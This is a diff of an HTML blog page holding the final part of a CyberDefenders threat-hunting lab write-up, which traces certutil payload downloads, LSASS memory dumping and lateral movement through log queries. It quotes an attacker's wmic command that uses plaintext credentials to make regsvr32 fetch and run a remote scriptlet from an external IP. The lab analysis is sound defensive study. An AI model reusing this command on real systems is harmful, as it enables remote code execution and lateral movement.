@@ -13,21 +13,20 @@
 
   <meta name="description" content="Cyber Corp Case 2 Writeup - Part 3 November 06, 2021 in threat-hunting,cyberdefenders">
 
-  <link rel="canonical" href="./cyber-corp-case-2-writeup-part-3.html">
+  <link rel="canonical" href="/cyber-corp-case-2-writeup-part-3.html">
 
-  <link href="./favicon.png" rel="icon">
+  <link href="/favicon.png" rel="icon">
 
-  <link href="http://www.accidentalrebel.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="AccidentalRebel.com Full Atom Feed" />
 
-  <link href="./theme/css/screen.css"  media="screen, projection" rel="stylesheet" type="text/css" />
-  <link href="./theme/css/tomorrow.css"  media="screen, projection" rel="stylesheet" type="text/css" />
+  <link href="/theme/css/screen.css"  media="screen, projection" rel="stylesheet" type="text/css" />
+  <link href="/theme/css/tomorrow.css"  media="screen, projection" rel="stylesheet" type="text/css" />
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.js"></script>
   <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
 
   
 <meta name="twitter:card" content="summary">
-<meta property="og:url" content="./cyber-corp-case-2-writeup-part-3.html">
+<meta property="og:url" content="/cyber-corp-case-2-writeup-part-3.html">
 <meta name="twitter:site:id" content="https://twitter.com/accidentalrebel">
 <meta name="twitter:creator:id" content="accidentalrebel">
 <meta property="og:title" content="Cyber Corp Case 2 Writeup - Part 3">
@@ -42,13 +41,13 @@
     <div class="container" id="site-title">
       <div class="col-md-8 col-md-offset-2">
 	<h1>
-	  <a href=".">
+	  <a href="">
 	    AccidentalRebel.com
 	  </a>
 	</h1>
 	<div id="profile">
 	  <div class="left">
-	    <img src="./theme/images/pic.png" />
+	    <img src="/theme/images/pic.png" />
 	  </div>
 	  <div class="right">
 	    My name is Karlo and I'm currently employed as a Cyber Security Engineer. I have an interest in threat hunting and malware analysis. I also work on cyber-security related programming projects like malware analysis tools and remote access tools.
@@ -57,8 +56,8 @@
 	</div>
 	<div id="nav">
 	  <ul>
-	    <li><a href=".">Home</a></li>
-	    <!-- <li><a href="./pages/made.html">My Works</a></li> -->
+	    <li><a href="">Home</a></li>
+	    <!-- <li><a href="/pages/made.html">My Works</a></li> -->
 	    <li class="icon-nav" id="twitter-nav"><a href="https://twitter.com/accidentalrebel">Twitter</a></li>
 	    <li class="icon-nav" id="github-nav"><a href="https://github.com/accidentalrebel">Github</a></li>
 	    <li class="icon-nav" id="feed-nav"><a href="./feeds/all.atom.xml">RSS</a></li>
@@ -71,11 +70,11 @@
     <div class="row">
       <div class="col-md-8 col-md-offset-2">
 	<article>
-          <h1><a href="./cyber-corp-case-2-writeup-part-3.html">Cyber Corp Case 2 Writeup - Part 3</a></h1>
+          <h1><a href="/cyber-corp-case-2-writeup-part-3.html">Cyber Corp Case 2 Writeup - Part 3</a></h1>
           <div class="meta">
             <time datetime="2021-11-06T11:10:00+08:00">November 06, 2021</time>
             in <span class="categories">
-              <a href="./tag/threat-hunting.html">threat-hunting</a>,              <a href="./tag/cyberdefenders.html">cyberdefenders</a>            </span>
+              <a href="/tag/threat-hunting.html">threat-hunting</a>,              <a href="/tag/cyberdefenders.html">cyberdefenders</a>            </span>
           </div>
         <p>The <a href="https://cyberdefenders.org/labs/75">second case of the CyberCorp challenge</a> on <a href="https://cyberdefenders.org/">CyberDefenders.org</a> is all about threat hunting. Created by <a href="https://twitter.com/BlackMatter23">@BlackMatter23</a> and his team, this challenge is based on a real-world attack so it is perfect for gaining practical experience in threat hunting.</p>
 <p>This write-up is the third and final part of this walkthrough. You could read <a href="threat-hunting-from-home-cyber-corp-wmi-persistence">Part 1 here</a> and <a href="cyber-corp-case-2-writeup-part-2">Part 2 here</a>.</p>
@@ -87,23 +86,23 @@
 <blockquote>
 <p>event_type:FileCreate OR event_type:NetworkConnection</p>
 </blockquote>
-<p><img alt="cyber-corp-case-2-writeup-part-3-01" src="./images/cyber-corp-case-2-writeup-part-3-01.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-01" src="/images/cyber-corp-case-2-writeup-part-3-01.png" /></p>
 <p>The result shows <code>cmd.exe</code> creating a <code>certutil.exe</code> process. And the reason why this is suspicious is that <code>certutil.exe</code> can be used as an alternative way of downloading files from an external source. You can read more about this <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/">here</a>.</p>
 <p>The next event shows <code>certutil.exe</code> establishing a connection to an external IP and downloading the file <code>chrome_installer.log2:data</code>. This tells us the first half of the answer to the question.</p>
 <p>The next step is to find out the SHA256 of the decoded version of the downloaded file. I then updated the timestamp to <code>Jun 22, 2021 @ 07:46:10.000</code>, which is the time the file was downloaded, and then used the query:</p>
 <blockquote>
 <p>event_type:ProcessCreate AND enrich.ioa.max_severity:*</p>
 </blockquote>
-<p><img alt="cyber-corp-case-2-writeup-part-3-02" src="./images/cyber-corp-case-2-writeup-part-3-02.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-02" src="/images/cyber-corp-case-2-writeup-part-3-02.png" /></p>
 <p>We could see that <code>cmd.exe</code> created the process <code>svchost.exe</code>, but the suspicious thing is that the process' directory is <code>c:\windows\temp\</code> which is highly unusual for <code>svchost.exe</code> to run from. We can easily assume that the previously downloaded <code>chrome_installer.log2</code> was renamed to <code>svchost.exe</code> and this is the one that it ran. Getting the hash for this file will give us the second half of our answer to this question.</p>
 <h2 id="finding-the-dump-file">Finding the dump file</h2>
 <blockquote>
 <p>Question 12. During the post-exploitation process, the attacker used one of the standard Windows utilities to create a memory dump of a sensitive system process that contains credentials of active users in the system. Specify the name of the executable file of the utility used and the name of the memory dump file created, separated by a comma without spaces.</p>
 </blockquote>
 <p>Without changing the date range and the query from the previous question, I continued to investigate the other events that have a value of <code>high</code> in its <code>enrich.ioa.max_severity</code> field. The event below happened a few seconds after the event from the previous question.</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-03" src="./images/cyber-corp-case-2-writeup-part-3-03.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-03" src="/images/cyber-corp-case-2-writeup-part-3-03.png" /></p>
 <p>From the <code>enrich.ioa.rules</code> field we can see the value <code>win_memory_dumping_via_comsvcs_minidump</code>. What happened was that <code>rundll32.exe</code> executed the <code>comsvs.dll</code> and dumped the LSASS memory into a dump file. You can learn more about this technique <a href="https://attack.mitre.org/techniques/T1003/001/">here</a>. Here is that technique visualized with <a href="https://github.com/accidentalrebel/vATTACK">my vATT&amp;CK tool</a>:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-04" src="./images/cyber-corp-case-2-writeup-part-3-04.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-04" src="/images/cyber-corp-case-2-writeup-part-3-04.png" /></p>
 <p>From the information above, we now have what we need to answer the question.</p>
 <h2 id="detecting-lateral-movement">Detecting lateral movement</h2>
 <blockquote>
@@ -123,7 +122,7 @@
 <blockquote>
 <p>net_dst_ipv4:192.168.184.100 AND enrich.ioa.max_severity:*</p>
 </blockquote>
-<p><img alt="cyber-corp-case-2-writeup-part-3-05" src="./images/cyber-corp-case-2-writeup-part-3-05.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-05" src="/images/cyber-corp-case-2-writeup-part-3-05.png" /></p>
 <p>As we can see, we have a <code>wmic</code> command that passes the username and password to the domain controller's IP. This answers question 13.</p>
 <h2 id="side-quest-tracing-the-next-steps">Side Quest: Tracing the next steps</h2>
 <p>I wanted to find out what exactly happens when the command line from the previous question is run:</p>
@@ -131,7 +130,7 @@
 <p>wmic  /node:192.168.184.100 /user:inventory /password:jschindler35 process call create 'regsvr32 /u /n /s /i:http://94.177.253.126:8080/Ec9KoccK.sct scrobj.dll'</p>
 </blockquote>
 <p>From <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-6---wmi-execute-remote-process">my research</a>, I learned that this is using WMI to execute a process on a remote host. In this case, <code>regsvr32</code> is called to execute the specified remote <code>.sct</code> file with <code>scrobj.dll</code>. More info about this technique <a href="https://attack.mitre.org/techniques/T1218/010/">here</a> and <a href="https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1218.010/T1218.010.md#atomic-test-2---regsvr32-remote-com-scriptlet-execution">here</a>. </p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-06" src="./images/cyber-corp-case-2-writeup-part-3-06.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-06" src="/images/cyber-corp-case-2-writeup-part-3-06.png" /></p>
 <h2 id="the-second-group">The second group</h2>
 <blockquote>
 <p>Question 14. A compromised user account is a member of two Built-in privileged groups on the Domain Controller. The first group is the Administrators. Find the second group. Provide the SID of this group as an answer.</p>
@@ -146,7 +145,7 @@
 <p>("inventory<em>" OR "group</em>") AND "DC01-CYBERCORP.cybercorp.com" AND dev_ipv4:192.168.184.100 AND usr_tgt_name:Inventory</p>
 </blockquote>
 <p>There will be a lot of entries, but the one below would have information that we need:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-07" src="./images/cyber-corp-case-2-writeup-part-3-07.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-07" src="/images/cyber-corp-case-2-writeup-part-3-07.png" /></p>
 <p>The event lists the group membership information for the user <code>inventory</code>. Within the field <code>usr_token_groups</code> we can see the following information:</p>
 <div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="c">%{S-1-5-21-3899523589-2416674273-2941457644-513}</span><span class="w"></span>
 <span class="w">    </span><span class="c">%{S-1-1-0}</span><span class="w"></span>
@@ -168,7 +167,7 @@
 <p>"S-1-*" AND groups AND "DC01-CYBERCORP.cybercorp.com" AND dev_ipv4:192.168.184.100</p>
 </blockquote>
 <p>This revealed a new type of <code>event_type</code> value which is <code>InventoryInfo</code>, as shown below:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-08" src="./images/cyber-corp-case-2-writeup-part-3-08.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-08" src="/images/cyber-corp-case-2-writeup-part-3-08.png" /></p>
 <p>This inventory info seems to be from an inventory collection tool, but I could not get more info more than that. What is important to us though is the <code>dev_inventory</code> field which contains:</p>
 <div class="codehilite"><pre><span></span><code>...
 {
@@ -209,7 +208,7 @@
 <p>dev_ipv4:192.168.184.100 OR "regsvr32"</p>
 </blockquote>
 <p>The results of this query was more revealing:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-09" src="./images/cyber-corp-case-2-writeup-part-3-09.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-09" src="/images/cyber-corp-case-2-writeup-part-3-09.png" /></p>
 <p>The very first entry is our <code>wmic</code> event that used <code>regsvr32</code>. This is followed by a PowerShell script accessing <code>lsass.exe</code> and also injecting code into <code>svchost.exe</code>.</p>
 <p>I then continued down the list of events to check for any outbound network connections with an IP that has not been previously seen. Unfortunately, the events are still too many to go through. Looking at the Top 5 values also wasn't of too much help.</p>
 <p>Going back to the list of events we can see that immediately following the <code>wmic</code> event, there is a <code>powershell</code> process that accesses <code>lsass.exe</code>. It also has a very interesting entry under the <code>proc_cmdline</code> field:</p>
@@ -217,13 +216,13 @@
 </code></pre></div>
 
 <p>Decoding the base64 string would reveal a PowerShell script that has a hash that <a href="https://www.virustotal.com/gui/file/f4a3fa10be15ad4414ce897a5d7fcd43d7a6f7b28855adbec76c545d72c87662/detection">VirusTotal flags as malicious</a>. </p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-11" src="./images/cyber-corp-case-2-writeup-part-3-11.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-11" src="/images/cyber-corp-case-2-writeup-part-3-11.png" /></p>
 <p>This is a good indication that this PowerShell process is up to no good. Now we need to find out what other things this process did. The process has a PID of 4460, so plugging that into a query we get:</p>
 <blockquote>
 <p>(proc_id:4460 OR proc_p_id:4460 OR proc_c_id:4460 OR proc_tgt_id:4460) AND dev_ipv4:192.168.184.100</p>
 </blockquote>
 <p>And these are the results:</p>
-<p><img alt="cyber-corp-case-2-writeup-part-3-12" src="./images/cyber-corp-case-2-writeup-part-3-12.png" /></p>
+<p><img alt="cyber-corp-case-2-writeup-part-3-12" src="/images/cyber-corp-case-2-writeup-part-3-12.png" /></p>
 <p>Looking at the external IP that the process is connecting to, we could see that this is something new that we have not seen before. Thankfully, I had been making a list of all internal and external IPs that I came across during the challenge (Just shows the importance of writing down every information you come across!). Plugging this IP is our solution to this problem.</p>
 <hr />
 <p>There we have it. We've gone through and answered all 15 questions. Congratulations if you've made it this far!</p>
@@ -239,13 +238,13 @@
 	     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
 	    /*
 	     var disqus_config = function () {
-	     this.page.url = AccidentalRebel;  // Replace PAGE_URL with your page's canonical URL variable
+	     this.page.url = ;  // Replace PAGE_URL with your page's canonical URL variable
 	     this.page.identifier = cyber-corp-case-2-writeup-part-3.html; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
 	     };
 	    */
 	    (function() { // DON'T EDIT BELOW THIS LINE
 		var d = document, s = d.createElement('script');
-		s.src = 'https://accidentalrebel.disqus.com//embed.js';
+		s.src = '/embed.js';
 		s.setAttribute('data-timestamp', +new Date());
 		(d.head || d.body).appendChild(s);
 	    })();
@@ -265,14 +264,5 @@
       </div>
     </footer>
 
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-55068085-2"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-
-      gtag('config', 'UA-55068085-2');
-    </script>
   </body>
 </html>
